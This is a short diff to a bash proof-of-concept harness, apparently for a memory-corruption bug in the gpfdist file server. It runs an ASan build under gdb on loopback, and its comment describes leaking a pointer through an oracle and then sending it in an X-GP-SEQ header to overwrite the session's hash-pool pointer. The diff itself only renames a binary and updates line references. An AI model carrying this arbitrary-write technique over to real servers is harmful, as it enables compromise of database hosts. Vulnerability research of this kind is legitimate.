@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# Loopback-only: create a session in-bounds (id=0), use the :3517 sequence
+# Loopback-only: create a session in-bounds (id=0), use the :3520-3521 Linux
 # oracle to learn the value in the pointer-valued seq_segs[28] slot, then
 # send that value as X-GP-SEQ so :3677 writes an attacker-supplied 64-bit
 # value into the session->requests hash pool pointer.
@@ -11,7 +11,7 @@ printf 'row1\n' > "$OUT/data/out.txt"
 : > "$OUT/server.log"
 export ASAN_OPTIONS='detect_leaks=0:abort_on_error=0'
 cd "$HERE"
-gdb -q -batch -x gdb_pointer_chosen.gdb ./gpfdist_v761_asan >"$OUT/gdb.log" 2>&1 &
+gdb -q -batch -x gdb_pointer_chosen.gdb ./gpfdist_v7.6.1_asan >"$OUT/gdb.log" 2>&1 &
 GPID=$!
 for i in $(seq 1 80); do (echo >"/dev/tcp/127.0.0.1/$PORT") >/dev/null 2>&1 && break; sleep 0.1; done
 S="http://127.0.0.1:$PORT/out.txt"
